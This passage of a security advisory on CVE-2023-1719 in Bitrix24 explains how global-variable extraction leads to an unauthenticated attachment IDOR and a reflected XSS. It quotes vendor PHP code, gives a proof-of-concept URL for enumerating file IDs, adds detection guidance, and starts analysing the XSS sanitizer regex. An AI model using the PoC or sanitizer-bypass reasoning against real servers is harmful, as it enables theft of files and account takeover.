</span></span><span class="line"><span class="cl">        <span class="s1">&#39;HTTP_ENV_VARS&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;HTTP_GET_VARS&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;HTTP_POST_VARS&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;HTTP_POST_FILES&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;HTTP_COOKIE_VARS&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;HTTP_SERVER_VARS&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">foreach</span><span class="p">(</span><span class="nv">$superglobals</span> <span class="k">as</span> <span class="nv">$gl</span><span class="o">=&gt;</span><span class="nv">$t</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">unset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="nv">$gl</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">unset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nv">$gl</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">unset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$gl</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">unset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="nv">$gl</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$register_globals</span> <span class="o">=</span> <span class="nx">ini_get_bool</span><span class="p">(</span><span class="s2">&#34;register_globals&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$register_globals</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$toGlobals</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span><span class="p">(</span><span class="nv">$_ENV</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$superglobals</span><span class="p">[</span><span class="nv">$key</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$toGlobals</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span><span class="p">(</span><span class="nv">$_GET</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$superglobals</span><span class="p">[</span><span class="nv">$key</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$toGlobals</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span><span class="p">(</span><span class="nv">$_POST</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$superglobals</span><span class="p">[</span><span class="nv">$key</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$toGlobals</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span><span class="p">(</span><span class="nv">$_COOKIE</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$superglobals</span><span class="p">[</span><span class="nv">$key</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$toGlobals</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span><span class="p">(</span><span class="nv">$_SERVER</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$superglobals</span><span class="p">[</span><span class="nv">$key</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$toGlobals</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">//$GLOBALS += $toGlobals;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">//PHP7 bug
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">foreach</span><span class="p">(</span><span class="nv">$toGlobals</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="nv">$key</span><span class="p">]))</span> <span class="c1">// [2]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$GLOBALS</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">;</span>  <span class="c1">// [1]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>This function iterates over the key-value pairs in <code>$_GET</code>, <code>$_POST</code> and <code>$_COOKIE</code>, and assign them to <code>$GLOBALS</code> at <code>[1]</code>, provided the key is not on the denylist <code>$superglobals</code> and has not been set before (<code>[2]</code>).</p>
<p>The caller of this function, <code>start.php</code>, is a vital part of the initialization process for Bitrix24 to handle new requests. Besides extracting global variables from HTTP request, it also initializes database connections, security middlewares and loggers. Thus, an attacker is able to define global variables in querystring, post body and cookies before entering most of the business logics on Bitrix24. In another word, if a variable is not defined before being used, its value could be controlled by attacker. An instance of this case can be found in <code>/pub/im.file.php</code> :</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// /pub/im.file.php
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// [1]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">require_once</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;DOCUMENT_ROOT&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;/bitrix/modules/main/include/prolog_before.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$request</span> <span class="o">=</span> <span class="nx">Bitrix\Main\Application</span><span class="o">::</span><span class="na">getInstance</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">getContext</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">getRequest</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;FILE_ID&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$request</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;SIGN&#39;</span><span class="p">))</span>    <span class="c1">// [2]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$diskFileId</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;FILE_ID&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$signer</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">\Bitrix\Main\Security\Sign\Signer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$sign</span> <span class="o">=</span> <span class="nx">htmlspecialcharsbx</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;SIGN&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$sign</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$signer</span><span class="o">-&gt;</span><span class="na">unsign</span><span class="p">(</span><span class="nv">$sign</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">catch</span> <span class="p">(</span><span class="nx">\Bitrix\Main\Security\Sign\BadSignatureException</span> <span class="nv">$e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">CHTTP</span><span class="o">::</span><span class="na">SetStatus</span><span class="p">(</span><span class="s1">&#39;404 Not Found&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$diskFileId</span> <span class="o">===</span> <span class="nv">$sign</span><span class="p">)</span>    <span class="c1">// [3]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">\Bitrix\Disk\File</span><span class="o">::</span><span class="na">getById</span><span class="p">(</span><span class="nv">$diskFileId</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">!==</span> <span class="k">null</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$fileId</span> <span class="o">=</span> <span class="nv">$file</span><span class="o">-&gt;</span><span class="na">getFileId</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$fileId</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">CFile</span><span class="o">::</span><span class="na">ViewByUser</span><span class="p">(</span><span class="nv">$fileId</span><span class="p">);</span>    <span class="c1">// [4]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">CHTTP</span><span class="o">::</span><span class="na">SetStatus</span><span class="p">(</span><span class="s1">&#39;404 Not Found&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>At <code>[1]</code>, the server loads <code>prolog_before.php</code> which will eventualy include <code>start.php</code> to modify global variables.
At <code>[2]</code>,  <code>FILE_ID</code> and <code>SIGN</code> are supposed to be read from querystring and assigned to variable <code>$diskFileId</code> and <code>$sign</code> correspondingly. A crypto-safe signing class <code>\Bitrix\Main\Security\Sign\Signer</code> is introduced here to ensure authentity.</p>
<p>Later on, the server checks if the decoded singature is equal to file ID at <code>[3]</code>, then it fetches attachment records from database by ID and serves the attachment in reponse at <code>[4]</code>.</p>
<p>However, it is discovered that the variables <code>$diskFileId</code> and <code>$sign</code> are only defined when the <code>if</code> conditions at <code>[2]</code> are met. Otherwise, these two variables can be overwritten by setting global variables in <code>FormDecode()</code> function.</p>
<p>Since the attachment ID stored in database is a self-incrementing integer, it is possible for an unauthenticated attacker to enumerate IDs starting from 1 and retrive all valid attachments.</p>
<h3 id="proof-of-concept">Proof-of-Concept:<a hidden class="anchor" aria-hidden="true" href="#proof-of-concept">#</a></h3>
<p>The PoC provided below retrives the attachment whose ID is 8 on <code>TARGET_HOST</code>:</p>
<p><code>http://TARGET_HOST/pub/im.file.php?diskFileId=8&amp;sign=8</code></p>
<p>In trail version of Bitrix24, attachment with ID 8 should be &ldquo;form.docx&rdquo; shipped as sample data, as shown in the following image:</p>
<p><img loading="lazy" src="/advisories/23/images/CVE-2023-1719_01.Attachment-IDOR.png" alt=""  />
</p>
<h3 id="exploit-conditions">Exploit Conditions:<a hidden class="anchor" aria-hidden="true" href="#exploit-conditions">#</a></h3>
<p>This vulnerability can be exploited without any valid credentials.</p>
<h3 id="detection-guidance">Detection Guidance:<a hidden class="anchor" aria-hidden="true" href="#detection-guidance">#</a></h3>
<p>It is possible to detect the exploitation of this vulnerability by examining traffic logs to detect the presence of the string <code>diskFileId</code> and <code>sign</code> in HTTP request. The presence of these two strings set to the same numeric value (for example, <code>diskFileId=8</code> and <code>sign=8</code>) indicates possible exploitation of this vulnerability.</p>
<p>It is important to note that these two variable can be sent not only in querystring, but also in cookie and post body, separately.</p>
<h2 id="2-reflected-xss">2. Reflected XSS<a hidden class="anchor" aria-hidden="true" href="#2-reflected-xss">#</a></h2>
<h3 id="vulnerability-details-1">Vulnerability Details:<a hidden class="anchor" aria-hidden="true" href="#vulnerability-details-1">#</a></h3>
<p>This report presents information on a cross-site scripting (XSS) vulnerability caused by global variable extraction in Bitrix24. This vulnerability allows an attacker to execute arbitrary JavaScript code on the browser of any victim that visits the affected page. If the victim has administrator permissions, an attacker may leverage the built-in &ldquo;PHP Command Line&rdquo; feature to execute arbitrary system commands on the target web server.</p>
<p>It was discovered that the function <code>FormDecode</code> located at <code>bitrix/modules/main/tools.php</code> is called by <code>bitrix/modules/main/start.php</code> to extract variables from HTTP request into <code>$GLOBALS</code> array.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// bitrix/modules/main/tools.php
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">FormDecode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$superglobals</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;_GET&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;_SESSION&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;_POST&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;_COOKIE&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;_REQUEST&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;_FILES&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;_SERVER&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;GLOBALS&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;_ENV&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;DBType&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span>  <span class="s1">&#39;DBDebug&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;DBDebugToFile&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;DBHost&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;DBName&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;DBLogin&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;DBPassword&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;HTTP_ENV_VARS&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;HTTP_GET_VARS&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;HTTP_POST_VARS&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;HTTP_POST_FILES&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;HTTP_COOKIE_VARS&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;HTTP_SERVER_VARS&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">foreach</span><span class="p">(</span><span class="nv">$superglobals</span> <span class="k">as</span> <span class="nv">$gl</span><span class="o">=&gt;</span><span class="nv">$t</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">unset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="nv">$gl</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">unset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nv">$gl</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">unset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$gl</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">unset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="nv">$gl</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$register_globals</span> <span class="o">=</span> <span class="nx">ini_get_bool</span><span class="p">(</span><span class="s2">&#34;register_globals&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$register_globals</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$toGlobals</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span><span class="p">(</span><span class="nv">$_ENV</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$superglobals</span><span class="p">[</span><span class="nv">$key</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$toGlobals</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span><span class="p">(</span><span class="nv">$_GET</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$superglobals</span><span class="p">[</span><span class="nv">$key</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$toGlobals</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span><span class="p">(</span><span class="nv">$_POST</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$superglobals</span><span class="p">[</span><span class="nv">$key</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$toGlobals</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span><span class="p">(</span><span class="nv">$_COOKIE</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$superglobals</span><span class="p">[</span><span class="nv">$key</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$toGlobals</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span><span class="p">(</span><span class="nv">$_SERVER</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$superglobals</span><span class="p">[</span><span class="nv">$key</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$toGlobals</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">//$GLOBALS += $toGlobals;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">//PHP7 bug
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">foreach</span><span class="p">(</span><span class="nv">$toGlobals</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="nv">$key</span><span class="p">]))</span> <span class="c1">// [2]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$GLOBALS</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">;</span>  <span class="c1">// [1]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>This function iterates over the key-value pairs in <code>$_GET</code>, <code>$_POST</code> and <code>$_COOKIE</code>, and assign them to <code>$GLOBALS</code> at <code>[1]</code>, provided the key is not on the denylist <code>$superglobals</code> and has not been set before (<code>[2]</code>).</p>
<p>The caller of this function, <code>start.php</code>, is a vital part of the initialization process for Bitrix24 to handle new requests. Besides extracting global variables from HTTP request, it also initializes database connections, security middlewares and loggers. Thus, an attacker is able to define global variables in querystring, post body and cookies before entering most of the business logics on Bitrix24. In another word, if a variable is not defined before being used, its value could be controlled by attacker.</p>
<p>An instance of this case can be found in <code>bitrix/components/bitrix/socialnetwork.events_dyn/get_message_2.php</code> :</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// bitrix/components/bitrix/socialnetwork.events_dyn/get_message_2.php
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// [1]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">require_once</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;DOCUMENT_ROOT&#34;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;/bitrix/modules/main/include/prolog_before.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&#34;USER&#34;</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">IsAuthorized</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$log_cnt</span> <span class="o">=</span> <span class="nx">CUserCounter</span><span class="o">::</span><span class="na">GetValueByUserID</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&#34;USER&#34;</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">GetID</span><span class="p">(),</span> <span class="nv">$site</span><span class="p">);</span> <span class="c1">// [2]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="nv">$arData</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="k">array</span><span class="p">(</span><span class="s2">&#34;LOG_CNT&#34;</span> <span class="o">=&gt;</span> <span class="nv">$log_cnt</span><span class="p">)</span>    <span class="c1">// [3]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">CUtil</span><span class="o">::</span><span class="na">PhpToJSObject</span><span class="p">(</span><span class="nv">$arData</span><span class="p">);</span>     <span class="c1">// [4]
</span></span></span></code></pre></div><p>At <code>[1]</code>, the server loads <code>prolog_before.php</code> which will eventualy include <code>start.php</code> to modify global variables. If the current request is an authenticated session, variable <code>$log_cnt</code> will be defined at <code>[2]</code>.
Later on, <code>$log_cnt</code> is stored into an array <code>$arData</code> at <code>[3]</code> and passed on to <code>CUtil::PhpToJSObject</code>. The return value will be written to response at <code>[4]</code>.</p>
<p>However, if the request does not contain authenticated session cookies, <code>$log_cnt</code> will not be defined at <code>[2]</code>. Thus, it can be overwritten by setting global variables in <code>FormDecode()</code> function.</p>
<p>The image below shows <code>log_cnt</code> in the querystring reflected in the response with minor modification, proving that it is possible to inject HTML codes:</p>
<p><img loading="lazy" src="/advisories/23/images/CVE-2023-1719_02.XSS.png" alt=""  />
</p>
<p>However, the built-in Bitrix XSS sanitizer, applied to parameters of every request, complicates exploitation of this vulnerability.</p>
<p>The XSS sanitizer uses several regular expressions (regex) to identify and sanitize potentially dangerous input. One of these aims to target HTML event handlers, which could lead to XSS. The regex used can be found in <code>bitrix/modules/security/lib/filter/auditor/xss.php</code> on line 173, and a simplified version is shown below:</p>
<pre tabindex="0"><code>/(on[a-z]*)([a-z]{3}[\s]*=)/is
</code></pre><p>The regex aims to identify patterns such as <code>onerror=</code> and uses two capturing groups to split the dangerous string into two parts. A space is then added between the two parts, neutralizing the event handler. For example, <code>onerror=</code> would be transformed into <code>oner ror=</code>. Note that the regex allows any amount of whitespace between the event handler name (eg <code>onerror</code>) and the equals sign (<code>=</code>). This is compliant with the HTML specification. On its own, this sanitizer is secure.</p>
